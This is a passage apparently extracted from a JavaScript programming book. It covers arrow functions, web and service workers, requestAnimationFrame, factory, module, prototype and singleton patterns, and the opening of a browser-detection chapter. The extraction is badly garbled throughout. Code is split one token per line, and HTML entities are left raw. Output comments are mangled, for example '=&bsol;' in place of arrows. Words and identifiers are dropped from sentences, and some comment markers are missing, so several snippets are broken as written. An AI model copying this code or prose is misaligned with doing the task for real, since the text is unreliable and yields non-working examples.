assign the same type of function into constant variables:

**const**

foo

=

bar

=&gt;

bar

&plus;

1

;

**const**

bar

=

(

baz

)

=&gt;

baz

&plus;

1

;

However, if the arrow function takes no parameters, or more than one
parameter, a new set of parentheses *must* encase all the arguments:

(

(

)

=&gt;

&quot;foo&quot;

)

(

)

*// -&amp;quot;foo&quot;*

(

(

bow

,

arrow

)

=&gt;

bow

&plus;

arrow

)

(

&apos;I took an arrow &apos;

,

&apos;to the knee&hellip;&apos;

)

*// -&amp;quot;I took an arrow to the knee&hellip;&quot;*

If the function body doesn&apos;t consist of a single expression, it must
be surrounded by brackets and use an explicit **return** statement for
providing a result:

(

bar

=&gt;

{

**const**

baz

=

41

;

**return**

bar

&plus;

baz

;

}

)

(

1

)

;

*// -&bsol;42*

If the arrow function&apos;s body consists only of an object literal, this
object literal has to be enclosed in parentheses:

(

bar

=&gt;

(

{

baz

:

1

}

)

)

(

)

;

*// -&bsol;Object {baz: 1}*

The extra parentheses indicate that the opening and closing brackets
are part of the object literal, i.e. they are not delimiters of the
function body.

## Section 62.2: Lexical Scoping & Binding (Value of &quot;this&quot;)

Arrow functions are [lexically
scoped](http://stackoverflow.com/questions/1047454/what-is-lexical-scope);
this means that their **this** Binding is bound to the context of the
surrounding scope. That is to say, whatever **this** refers to can be
preserved by using an arrow function.
>
Take a look at the following example. The class Cow has a method that
allows for it to print out the sound it makes after 1 second.

class

Cow

{

constructor

(

)

{

**this**

.

sound

=

&quot;moo&quot;

;

}

makeSoundLater

(

)

{

setTimeout

(

(

)

=&gt;

console.

log

(

**this**

.

sound

)

,

1000

)

;

}

}

**const**

betsy

=

**new**

Cow

(

)

;

betsy.

makeSoundLater

(

)

;

  
  makeSoundLater
  

  

  
  betsy.makeSoundLater
  

  

In the () method, the **this** context refers to the current instance
of the Cow object, so in the case where I call (), the **this**
context refers to betsy.

  -
  **this**                     .       sound
   - 

  -

By using the arrow function, I *preserve* the **this** context so that
I can make reference to when it comes time to print it out, which will
properly print out &quot;moo&quot;.
>
If you had used a regular function in place of the arrow function, you
would lose the context of being within the class, and not be able to
directly access the sound property.

## Section 62.3: Arguments Object

Arrow functions do not expose an arguments object; therefore,
arguments would simply refer to a variable in the current scope.

**const**

arguments

=

&lbrack;

**true**

&rbrack;

;

**const**

foo

=

x

=&gt;

console.

log

(

arguments

&lbrack;

0

&rbrack;

)

;

foo

(

**false**

)

;

*// -&bsol;true*

Due to this, arrow functions are also **not** aware of their
caller/callee.
>
While the lack of an arguments object can be a limitation in some edge
cases, rest parameters are generally a suitable alternative.

**const**

arguments

=

&lbrack;

**true**

&rbrack;

;

**const**

foo

=

(

&hellip;

arguments

)

=&gt;

console.

log

(

arguments

&lbrack;

0

&rbrack;

)

;

foo

(

**false**

)

;

*// -&bsol;false*

## Section 62.4: Implicit Return

Arrow functions may implicitly return values by simply omitting the
curly braces that traditionally wrap a function&apos;s body if their body
only contains a single expression.

**const**

foo

=

x

=&gt;

x

&plus;

1

;

foo

(

1

)

;

*// -&bsol;2*

When using implicit returns, object literals must be wrapped in
parenthesis so that the curly braces are not mistaken for the opening
of the function&apos;s body.
>
**const** foo = () =&bsol;{ bar: 1 } *// foo() returns undefined*
**const** foo = () =&lpar;{ bar: 1 }) *// foo() returns {bar: 1}*

## Section 62.5: Arrow functions as a constructor

Arrow functions will throw a TypeError when used with the **new**
keyword.

**const**

foo

=

**function**

(

)

{

**return**

&apos;foo&apos;

;

}

**const**

a

=

**new**

foo

(

)

;

**const**

bar

=

(

)

=&gt;

{

**return**

&apos;bar&apos;

;

}

**const**

b

=

**new**

bar

(

)

;

*// -&bsol;Uncaught TypeError: bar is not a constructor&hellip;*

## Section 62.6: Explicit Return

Arrow functions can behave very similar to classic functions in that
you may explicitly return a value from them using the **return**
keyword; simply wrap your function&apos;s body in curly braces, and return
a value:

**const**

foo

=

x

=&gt;

{

**return**

x

&plus;

1

;

}

foo

(

1

)

;

*// -&bsol;2*

# Chapter 63: Workers

## Section 63.1: Web Worker

A web worker is a simple way to run scripts in background threads as
the worker thread can perform tasks (including I/O tasks using
XMLHttpRequest) without interfering with the user interface. Once
created, a worker can send messages which can be different data types
(except functions) to the JavaScript code that created it by posting
messages to an event handler specified by that code (and vice versa.)
>
Workers can be created in a few ways.
>
The most common is from a simple URL:

**var**

webworker

=

**new**

Worker

(

&quot;./path/to/webworker.js&quot;

)

;

  
  URL.createObjectURL
  

  

It&apos;s also possible to create a Worker dynamically from a string using
():

**var**

workerData

=

&quot;function someFunction() {}; console.log(&apos;More code&apos;);&quot;

;

**var**

blobURL

=

URL.

createObjectURL

(

**new**

Blob

(

&lbrack;

&quot;(&quot;

&plus;

workerData

&plus;

&quot;)&quot;

&rbrack;

,

{

type

:

&quot;text/javascript&quot;

}

)

)

;

**var**

webworker

=

**new**

Worker

(

blobURL

)

;

  -
  Function                          .    toString
    

  -

The same method can be combined with () to create a worker from an
existing function:

**var**

workerFn

=

**function**

(

)

{

console.

log

(

&quot;I was run&quot;

)

;

}

;

**var**

blobURL

=

URL.

createObjectURL

(

**new**

Blob

(

&lbrack;

&quot;(&quot;

&plus;

workerFn.

toString

(

)

&plus;

&quot;)&quot;

&rbrack;

,

{

type

:

&quot;text/javascript&quot;

}

)

)

;

**var**

webworker

=

**new**

Worker

(

blobURL

)

;

## Section 63.2: A simple service worker

**main.js**
>
A service worker is an event-driven worker registered against an
origin and a path. It takes the form of a JavaScript file that can
control the web page/site it is associated with, intercepting and
modifying navigation and resource requests, and caching resources in a
very granular fashion to give you complete control over how your app
behaves in certain situations (the most obvious one being when the
network is not available.)
>
Source:
[MDN](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API)
>
**Few Things:**

1.  It&apos;s a JavaScript Worker, so it can&apos;t access the DOM directly

2.  It&apos;s a programmable network proxy

3.  It will be terminated when not in use and restarted when it&apos;s next
    needed

4.  A service worker has a lifecycle which is completely separate from
    your web page

5.  HTTPS is Needed

  
  **&lt;script**
  

  

This code that will be executed in the Document context, (or) this
JavaScript will be included in your page via a **&gt;** tag.

*// we check if the browser supports ServiceWorkers*

**if**

(

&apos;serviceWorker&apos;

**in**

navigator

)

{

navigator

.

serviceWorker

.

register

(

*// path to the service worker file*

&apos;sw.js&apos;

)

*// the registration is async and it returns a promise*

.

then

(

**function**

(

reg

)

{

console.

log

(

&apos;Registration Successful&apos;

)

;

}

)

;

}

**sw.js**
>
This is the service worker code and is executed in the [ServiceWorker
Global
Scope](https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerGlobalScope).

self.

addEventListener

(

&apos;fetch&apos;

,

**function**

(

event

)

{

*// do nothing here, just log all the network requests*

console.

log

(

event.

request

.

url

)

;

}

)

;

## Section 63.3: Register a service worker

*// Check if service worker is available.*

**if**

(

&apos;serviceWorker&apos;

**in**

navigator

)

{

navigator.

serviceWorker

.

register

(

&apos;/sw.js&apos;

)

.

then

(

**function**

(

registration

)

{

console.

log

(

&apos;SW registration succeeded with scope:&apos;

,

registration.

scope

)

;

}

)

.

**catch**

(

**function**

(

e

)

{

console.

log

(

&apos;SW registration failed with error:&apos;

,

e

)

;

}

)

;

}

You can call

register

(

)

on every page load. If the SW is already registered, the browser
provides you with

instance that is already running

The SW file can be any name.

sw.

js

is common.

The location of the SW file is important because it defines the SW&apos;s
scope. For example, an SW file at

  -
  js   /   sw.js   can only intercept fetch requests for files that begin with js
                   /                                                           
    - - 

  -

//. For this reason you usually see the

SW file at the top-level directory of the project.

## Section 63.4: Communicating with a Web Worker

Since workers run in a separate thread from the one that created them,
communication needs to happen via postMessage.
>
**Note:** Because of the different export prefixes, some browsers have
webkitPostMessage instead of postMessage. You should override
postMessage to make sure workers &quot;work&quot; (no pun intended) in the
most places possible: worker.postMessage = (worker.webkitPostMessage
&vert;&vert; worker.postMessage);
>
From the main thread (parent window):

*// Create a worker*

**var**

webworker

=

**new**

Worker

(

&quot;./path/to/webworker.js&quot;

)

;

*// Send information to worker*

webworker.

postMessage

(

&quot;Sample message&quot;

)

;

*// Listen for messages from the worker*

webworker.

addEventListener

(

&quot;message&quot;

,

**function**

(

event

)

{

*// &grave;event.data&grave; contains the value or object sent from the worker*

console.

log

(

&quot;Message from worker:&quot;

,

event.

data

)

;

*// &lbrack;&quot;foo&quot;, &quot;bar&quot;, &quot;baz&quot;&rbrack;*

}

)

;

  
  webworker.js
  

  

From the worker, in :

*// Send information to the main thread (parent window)*

self.

postMessage

(

&lbrack;

&quot;foo&quot;

,

&quot;bar&quot;

,

&quot;baz&quot;

&rbrack;

)

;

*// Listen for messages from the main thread*

self.

addEventListener

(

&quot;message&quot;

,

**function**

(

event

)

{

*// &grave;event.data&grave; contains the value or object sent from main*

console.

log

(

&quot;Message from parent:&quot;

,

event.

data

)

;

*// &quot;Sample message&quot;*

}

)

;

Alternatively, you can also add event listeners using onmessage:
>
From the main thread (parent window):

webworker.

onmessage

=

**function**

(

event

)

{

console.

log

(

&quot;Message from worker:&quot;

,

event.

data

)

;

*// &lbrack;&quot;foo&quot;, &quot;bar&quot;, &quot;baz&quot;&rbrack;*

}

  
  webworker.js
  

  

From the worker, in :

self.

onmessage

=

**function**

(

event

)

{

console.

log

(

&quot;Message from parent:&quot;

,

event.

data

)

;

*// &quot;Sample message&quot;*

}

## Section 63.5: Terminate a worker

Once you are done with a worker you should terminate it. This helps to
free up resources for other applications on the user's computer.

*Main Thread:*

*// Terminate a worker from your application.*

worker.

terminate

(

)

;

*Note*: The terminate method is not available for service workers. It
will be terminated when not in use, and restarted when it&apos;s next
needed.

*Worker Thread:*

*// Have a worker terminate itself.*

self.

close

(

)

;

## Section 63.6: Populating your cache

After your service worker is registered, the browser will try to
install & later activate the service worker.
>
**Install event listener**

**this**

.

addEventListener

(

&apos;install&apos;

,

**function**

(

event

)

{

console.

log

(

&apos;installed&apos;

)

;

}

)

;

**Caching**
>
One can use this install event returned to cache the assets needed to
run the app offline. Below example uses the cache api to do the same.

**this**

.

addEventListener

(

&apos;install&apos;

,

**function**

(

event

)

{

event.

waitUntil

(

caches.

open

(

&apos;v1&apos;

)

.

then

(

**function**

(

cache

)

{

**return**

cache.

addAll

(

&lbrack;

*/&ast; Array of all the assets that needs to be cached &ast;/*

&apos;/css/style.css&apos;

,

&apos;/js/app.js&apos;

,

&apos;/images/snowTroopers.jpg&apos;

&rbrack;

)

;

}

)

)

;

}

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 63.7: Dedicated Workers and Shared Workers
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**Dedicated Workers**
>
A dedicated web worker is only accessible by the script that called
it.
>
Main application:

**var**

worker

=

**new**

Worker

(

&apos;worker.js&apos;

)

;

worker.

addEventListener

(

&apos;message&apos;

,

**function**

(

msg

)

{

console.

log

(

&apos;Result from the worker:&apos;

,

msg.

data

)

;

}

)

;

worker.

postMessage

(

&lbrack;

2

,

3

&rbrack;

)

;

worker.js:

self.

addEventListener

(

&apos;message&apos;

,

**function**

(

msg

)

{

console.

log

(

&apos;Worker received arguments:&apos;

,

msg.

data

)

;

self.

postMessage

(

msg.

data

&lbrack;

0

&rbrack;

&plus;

msg.

data

&lbrack;

1

&rbrack;

)

;

}

)

;

**Shared Workers**
>
A shared worker is accessible by multiple scripts  even if they are
being accessed by different windows, iframes or even workers.
>
Creating a shared worker is very similar to how to create a dedicated
one, but instead of the straight-forward communication between the
main thread and the worker thread, you&apos;ll have to communicate via a
port object, i.e., an explicit port has to be opened so multiple
scripts can use it to communicate with the shared worker. (Note that
dedicated workers do this implicitly) Main application

**var**

myWorker

=

**new**

SharedWorker

(

&apos;worker.js&apos;

)

;

myWorker.

port

.

start

(

)

;

*// open the port connection*

myWorker.

port

.

postMessage

(

&lbrack;

2

,

3

&rbrack;

)

;

worker.js

self.

port

.

start

(

)

;

open the port connection to enable two

&minus;

way communication

self.

onconnect

=

**function**

(

e

)

{

**var**

port

=

e&period;

ports

&lbrack;

0

&rbrack;

;

*// get the port*

port.

onmessage

=

**function**

(

e

)

{

console.

log

(

&apos;Worker received arguments:&apos;

,

e&period;

data

)

;

port.

postMessage

(

e&period;

data

&lbrack;

0

&rbrack;

&plus;

e&period;

data

&lbrack;

1

&rbrack;

)

;

}

}

  
  port.start
  

  

Note that setting up this message handler in the worker thread also
implicitly opens the port connection back to the parent thread, so the
call to () is not actually needed, as noted above.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 64: requestAnimationFrame
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**Parameter Details**

&quot;A parameter specifying a function to call when it&apos;s time to update
your animation for the next callback
>
repaint.&quot;
(<https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame)>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 64.1: Use requestAnimationFrame to fade in element
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**View jsFiddle**: <https://jsfiddle.net/HimmatChahal/jb5trg67/>
**Copy + Pasteable code below**:
>
**&lt;html&gt;**
>
**&lt;body&gt;**
>
**&lt;h1&gt;**This will fade in at 60 frames per second (or as close to
possible as your hardware allows)**&lt;/h1&gt;**
>
**&lt;script&gt;** // Fade in over 2000 ms = 2 seconds.
>
var FADE_DURATION = 2.0 &ast; 1000;
>
// -1 is simply a flag to indicate if we are rendering the very 1st
frame var startTime=-1.0;
>
// Function to render current frame (whatever frame that may be)
function render(currTime) { var head1 =
document.getElementsByTagName(&apos;h1&apos;)&lbrack;0&rbrack;;
>
// How opaque should head1 be? Its fade started at currTime=0.
>
// Over FADE_DURATION ms, opacity goes from 0 to 1 var opacity =
(currTime/FADE_DURATION); head1.style.opacity = opacity; }
>
// Function to function eachFrame() {
>
// Time that animation has been running (in ms)
>
// Uncomment the console.log function to view how quickly // the
timeRunning updates its value (may affect performance) var timeRunning
= (new Date()).getTime() - startTime; //console.log(&apos;var timeRunning
= &apos;+timeRunning+&apos;ms&apos;); if (startTime &lt; 0) {
>
// This branch: executes for the first frame only. // it sets the
startTime, then renders at currTime = 0.0 startTime = (new
Date()).getTime(); render(0.0);
>
} else if (timeRunning &lt; FADE_DURATION) {
>
// This branch: renders every frame, other than the 1st frame,
>
// with the new timeRunning value. render(timeRunning); } else {
return; }
>
// Now we are done rendering one frame.
>
// So we make a request to the browser to execute the next
>
// animation frame, and the browser optimizes the rest.
>
// This happens very rapidly, as you can see in the console.log();
window.requestAnimationFrame(eachFrame);
>
};

// start the animation

window.requestAnimationFrame

(

eachFrame

)

;

**&lt;**

**/script**

**&gt;**

**&lt;**

**/body**

**&gt;**

**&lt;**

**/html**

**&gt;**

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 64.2: Keeping Compatibility
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Of course, just like most things in browser JavaScript, you just
can&apos;t count on the fact that everything will be the same everywhere.
In this case, requestAnimationFrame might have a prefix on some
platforms and are named differently, such as
webkitRequestAnimationFrame. Fortunately, there&apos;s a really easy way
to group all the known differences that could exist down to 1
function:

window.

requestAnimationFrame

=

(

**function**

(

)

{

**return**

window.

requestAnimationFrame

&vert;&vert;

window.

webkitRequestAnimationFrame

&vert;&vert;

window.

mozRequestAnimationFrame

&vert;&vert;

**function**

(

callback

)

{

window.

setTimeout

(

callback

,

1000

/

60

)

;

}

;

}

)

(

)

;

Note that the last option (which fills in when no existing support was
found) will not return an id to be used in cancelAnimationFrame. There
is, however an [efficient
polyfill](https://gist.github.com/paulirish/1579671) that was written
which fixes this.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 64.3: Cancelling an Animation
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

To cancel a call to requestAnimationFrame, you need the id it returned
from when it was last called. This is the parameter you use for
cancelAnimationFrame. The following example starts some hypothetical
animation then pauses it after one second.

*// stores the id returned from each call to requestAnimationFrame*

**var**

requestId

;

*// draw something*

**function**

draw

(

timestamp

)

{

*// do some animation*

*// request next frame*

start

(

)

;

}

*// pauses the animation*

**function**

pause

(

)

{

*// pass in the id returned from the last call to requestAnimationFrame*

cancelAnimationFrame

(

requestId

)

;

}

*// begin the animation*

**function**

start

(

)

{

*// store the id returned from requestAnimationFrame*

requestId

=

requestAnimationFrame

(

draw

)

;

}

*// begin now*

start

(

)

;

*// after a second, pause the animation*

setTimeout

(

pause

,

1000

)

;

# Chapter 65: Creational Design Patterns

Design patterns are a good way to keep your **code readable** and DRY.
DRY stands for **don&apos;t repeat yourself**. Below you could find more
examples about the most important design patterns.

## Section 65.1: Factory Functions

A factory function is simply a function that returns an object.
>
Factory functions do not require the use of the **new** keyword, but
can still be used to initialize an object, like a constructor.
>
Often, factory functions are used as API wrappers, like in the cases
of [jQuery](https://jquery.com/) and
[moment.js](http://momentjs.com/), so users do not need to use
**new**.
>
The following is the simplest form of factory function; taking
arguments and using them to craft a new object with the object
literal:

**function**

cowFactory

(

name

)

{

**return**

{

name

:

name

,

talk

:

**function**

(

)

{

console.

log

(

&apos;Moo, my name is &apos;

&plus;

**this**

.

name

)

;

}

,

}

;

}

**var**

daisy

=

cowFactory

(

&apos;Daisy&apos;

)

;

*// create a cow named Daisy*

daisy.

talk

(

)

;

*// &quot;Moo, my name is Daisy&quot;*

It is easy to define private properties and methods in a factory, by
including them outside of the returned object.
>
This keeps your implementation details encapsulated, so you can only
expose the public interface to your object.

**function**

cowFactory

(

name

)

{

**function**

formalName

(

)

{

**return**

name

&plus;

&apos; the cow&apos;

;

}

**return**

{

talk

:

**function**

(

)

{

console.

log

(

&apos;Moo, my name is &apos;

&plus;

formalName

(

)

)

;

}

,

}

;

}

**var**

daisy

=

cowFactory

(

&apos;Daisy&apos;

)

;

daisy.

talk

(

)

;

*// &quot;Moo, my name is Daisy the cow&quot;*

daisy.

formalName

(

)

;

*// ERROR: daisy.formalName is not a function*

The last line will give an error because the function formalName is
closed inside the cowFactory function. This is a closure.
>
Factories are also a great way of applying functional programming
practices in JavaScript, because they are functions.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 65.2: Factory with Composition
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

[*&apos;Prefer composition over
inheritance&apos;*](http://programmers.stackexchange.com/questions/134097/why-should-i-prefer-composition-over-inheritance)
is an important and popular programming principle, used to assign
behaviors to objects, as opposed to inheriting many often unneeded
behaviors.
>
**Behaviour factories**

**var**

speaker

=

**function**

(

state

)

{

**var**

noise

=

state.

noise

&vert;&vert;

&apos;grunt&apos;

;

**return**

{

speak

:

**function**

(

)

{

console.

log

(

state.

name

&plus;

&apos; says &apos;

&plus;

noise

)

;

}

}

;

}

;

**var**

mover

=

**function**

(

state

)

{

**return**

{

moveSlowly

:

**function**

(

)

{

console.

log

(

state.

name

&plus;

&apos; is moving slowly&apos;

)

;

}

,

moveQuickly

:

**function**

(

)

{

console.

log

(

state.

name

&plus;

&apos; is moving quickly&apos;

)

;

}

}

;

}

;

**Object factories**

Version ≥ 6

**var**

person

=

**function**

(

name

,

age

)

{

**var**

state

=

{

name

:

name

,

age

:

age

,

noise

:

&apos;Hello&apos;

}

;

**return**

Object

.

assign

(

*// Merge our &apos;behaviour&apos; objects*

{

}

,

speaker

(

state

)

,

mover

(

state

)

)

;

}

;

**var**

rabbit

=

**function**

(

name

,

colour

)

{

**var**

state

=

{

name

:

name

,

colour

:

colour

}

;

**return**

Object

.

assign

(

{

}

,

mover

(

state

)

)

;

}

;

**Usage**

**var**

fred

=

person

(

&apos;Fred&apos;

,

42

)

;

fred.speak(); *// outputs: Fred says Hello* fred.moveSlowly(); *//
outputs: Fred is moving slowly*

**var** snowy = rabbit(&apos;Snowy&apos;, &apos;white&apos;); snowy.moveSlowly(); *//
outputs: Snowy is moving slowly* snowy.moveQuickly(); *// outputs:
Snowy is moving quickly* snowy.speak(); *// ERROR: snowy.speak is not
a function*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 65.3: Module and Revealing Module Patterns
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**Module Pattern**

The Module pattern is a [creational and structural design
pattern](https://en.wikipedia.org/wiki/Module_pattern#Module_as_a_design_pattern)
which provides a way of encapsulating private members while producing
a public API. This is accomplished by creating an IIFE which allows us
to define variables only available in its scope (through closure)
while returning an object which contains the public API.

This gives us a clean solution for hiding the main logic and only
exposing an interface we wish other parts of our application to use.

**var**

Module

=

(

**function**

(

*/&ast; pass initialization data if necessary &ast;/*

)

{

*// Private data is stored within the closure*

**var**

privateData

=

1

;

*// Because the function is immediately invoked,*

*// the return value becomes the public API*

**var**

api

=

{

getPrivateData

:

**function**

(

)

{

**return**

privateData

;

}

,

getDoublePrivateData

:

**function**

(

)

{

**return**

api.

getPrivateData

(

)

&ast;

2

;

}

}

;

**return**

api

;

}

)

(

*/&ast; pass initialization data if necessary &ast;/*

)

;

**Revealing Module Pattern**
>
The Revealing Module pattern is a variant in the Module pattern. The
key differences are that all members (private and public) are defined
within the closure, the return value is an object literal containing
no function definitions, and all references to member data are done
through direct references rather than through the returned object.

**var**

Module

=

(

**function**

(

*/&ast; pass initialization data if necessary &ast;/*

)

{

*// Private data is stored just like before*

**var**

privateData

=

1

;

*// All functions must be declared outside of the returned object*

**var**

getPrivateData

=

**function**

(

)

{

**return**

privateData

;

}

;

**var**

getDoublePrivateData

=

**function**

(

)

{

*// Refer directly to enclosed members rather than through the returned
object*

**return**

getPrivateData

(

)

&ast;

2

;

}

;

*// Return an object literal with no function definitions*

**return**

{

getPrivateData

:

getPrivateData

,

getDoublePrivateData

:

getDoublePrivateData

}

;

}

)

(

*/&ast; pass initialization data if necessary &ast;/*

)

;

**Revealing Prototype Pattern**
>
This variation of the revealing pattern is used to separate the
constructor to the methods. This pattern allow us to use the
javascript language like a objected oriented language:

![](./images/image038.png){width="7.486805555555556in"
height="7.459722222222222in"}

This code above should be in a separated file .js to be referenced in
any page that is needed. It can be used like this:

**var**

menuActive

=

**new**

NavigationNs.

active

(

&apos;ul.sidebar-menu li&apos;

,

5

)

;

menuActive.

setCurrent

(

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 65.4: Prototype Pattern
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

The prototype pattern focuses on creating an object that can be used
as a blueprint for other objects through prototypal inheritance. This
pattern is inherently easy to work with in JavaScript because of the
native support for prototypal inheritance in JS which means we don&apos;t
need to spend time or effort imitating this topology. **Creating
methods on the prototype**

**function**

Welcome

(

name

)

{

**this**

.

name

=

name

;

}

Welcome.

**prototype**

.

sayHello

=

**function**

(

)

{

**return**

&apos;Hello, &apos;

&plus;

**this**

.

name

&plus;

&apos;!&apos;

;

}

**var**

welcome

=

**new**

Welcome

(

&apos;John&apos;

)

;

welcome.

sayHello

(

)

;

*// =&bsol;Hello, John!*

**Prototypal Inheritance**
>
Inheriting from a &apos;parent object&apos; is relatively easy via the
following pattern
>
ChildObject.**prototype** = Object.create(ParentObject.**prototype**);
>
ChildObject.**prototype**.constructor = ChildObject;
>
Where ParentObject is the object you wish to inherit the prototyped
functions from, and ChildObject is the new Object you wish to put them
on.
>
If the parent object has values it initializes in its constructor you
need to call the parents constructor when initializing the child.
>
You do that using the following pattern in the ChildObject
constructor.

**function**

ChildObject

(

value

)

{

ParentObject.

call

(

**this**

,

value

)

;

}

A complete example where the above is implemented

**function**

RoomService

(

name

,

order

)

{

*// this.name will be set and made available on the scope of this
function*

Welcome.

call

(

**this**

,

name

)

;

**this**

.

order

=

order

;

}

*// Inherit &apos;sayHello()&apos; methods from &apos;Welcome&apos; prototype*

RoomService.

**prototype**

=

Object

.

create

(

Welcome.

**prototype**

)

;

*// By default prototype object has &apos;constructor&apos; property.*

*// But as we created new object without this property - we have to set
it manually,*

*// otherwise &apos;constructor&apos; property will point to &apos;Welcome&apos; class*

RoomService.

**prototype**

.

constructor

=

RoomService

;

RoomService.

**prototype**

.

announceDelivery

=

**function**

(

)

{

**return**

&apos;Your &apos;

&plus;

**this**

.

order

&plus;

&apos; has arrived!&apos;

;

}

RoomService.

**prototype**

.

deliverOrder

=

**function**

(

)

{

**return**

**this**

.

sayHello

(

)

&plus;

&apos; &apos;

&plus;

**this**

.

announceDelivery

(

)

;

}

**var**

delivery

=

**new**

RoomService

(

&apos;John&apos;

,

&apos;pizza&apos;

)

;

delivery.

sayHello

(

)

;

*// =&bsol;Hello, John!,*

delivery.

announceDelivery

(

)

;

*// Your pizza has arrived!*

delivery.

deliverOrder

(

)

;

*// =&bsol;Hello, John! Your pizza has arrived!*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 65.5: Singleton Pattern
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
The Singleton pattern is a design pattern that restricts the
instantiation of a class to one object. After the first object is
created, it will return the reference to the same one whenever called
for an object.

**var**

Singleton

=

(

**function**

(

)

{

*// instance stores a reference to the Singleton*

**var**

instance

;

**function**

createInstance

(

)

{

*// private variables and methods*

**var**

&lowbar;privateVariable
=
&apos;I am a private variable&apos;
;
**function**
&lowbar;privateMethod
(
)
{
console.
log
(
&apos;I am a private method&apos;
)
;
}
**return**
{
*// public methods and variables*
publicMethod
:
**function**
(

)

{

console.

log

(

&apos;I am a public method&apos;

)

;

}

,

publicVariable

:

&apos;I am a public variable&apos;

}

;

}

**return**

{

*// Get the Singleton instance if it exists*

*// or create one if doesn&apos;t*

getInstance

:

**function**

(

)

{

**if**

(

!

instance

)

{

instance

=

createInstance

(

)

;

}

**return**

instance

;

}

}

;

}

)

(

)

;

**Usage:**
>
*// there is no existing instance of Singleton, so it will create one*
**var** instance1 = Singleton.getInstance();
>
*// there is an instance of Singleton, so it will return the reference
to this one* **var** instance2 = Singleton.getInstance();
console.log(instance1 === instance2); *// true*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 65.6: Abstract Factory Pattern
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

The Abstract Factory Pattern is a creational design pattern that can
be used to define specific instances or classes without having to
specify the exact object that is being created.

![](./images/image039.png){width="7.486805555555556in"
height="4.045138888888889in"}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 66: Detecting browser
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Browsers, as they have evolved, offered more features to JavaScript.
But often these features are not available in all browsers. Sometimes
they may be available in one browser, but yet to be released on other
browsers. Other times, these features are implemented differently by
different browsers. Browser detection becomes important to ensure that
the application you develop runs smoothly across different browsers
and devices.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 66.1: Feature Detection Method
